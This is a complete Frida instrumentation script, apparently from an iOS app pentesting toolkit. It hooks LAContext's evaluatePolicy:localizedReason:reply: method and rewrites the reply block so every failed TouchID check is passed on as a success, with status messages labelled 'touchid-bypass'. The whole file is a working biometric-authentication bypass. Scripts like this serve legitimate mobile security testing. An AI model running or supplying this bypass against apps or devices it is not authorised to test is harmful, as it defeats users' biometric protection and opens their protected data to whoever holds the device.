var resolver = new ApiResolver('objc');
var LAContext_evaluatePolicy_localizedReason_reply = {};

resolver.enumerateMatches('-[LAContext evaluatePolicy:localizedReason:reply:]', {
    onMatch: function (match) {
        LAContext_evaluatePolicy_localizedReason_reply.name = match.name;
        LAContext_evaluatePolicy_localizedReason_reply.address = match.address;
    },
    onComplete: function () { }
});

if (LAContext_evaluatePolicy_localizedReason_reply.address) {

    send({
        status: 'success',
        error_reason: NaN,
        type: 'touchid-bypass',
        data: 'Hooked ' + LAContext_evaluatePolicy_localizedReason_reply.name
    });

    Interceptor.attach(LAContext_evaluatePolicy_localizedReason_reply.address, {
        onEnter: function (args) {
            
            var reason = new ObjC.Object(args[3]);

            var original_block = new ObjC.Block(args[4]);

            var saved_reply_block = original_block.implementation;

            original_block.implementation = function (success, error) {

                if (!success == true) {
                    success = true;
                }

                saved_reply_block(success, error);

                send({
                    status: 'success',
                    error_reason: NaN,
                    type: 'touchid-bypass',
                    data: 'TouchID bypass run complete'
                });

            };
        }
    });
}